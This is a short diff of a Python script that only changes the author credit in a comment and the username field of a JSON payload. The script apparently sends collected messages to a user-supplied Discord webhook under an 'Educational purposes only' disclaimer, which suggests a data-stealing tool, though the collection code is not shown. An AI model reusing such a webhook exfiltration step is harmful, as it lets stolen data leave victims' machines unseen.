@@ -7,7 +7,7 @@ import os
 import requests
 import json
 
-# Developer: NightfallGT fixed by github.com/Visual9999
+# Developer: NightfallGT
 # Educational purposes only
 
 WEBHOOK_URL = 'https://example.discord.com/api' #your webhook here
@@ -100,7 +100,7 @@ def main():
 
             payload = json.dumps({
                 'content': message,
-                "username": "github.vom/Visual9999"
+                "username": "github.vom/visuality1337"
                 })
 
             req = requests.post(WEBHOOK_URL, data=payload.encode(), headers=headers)
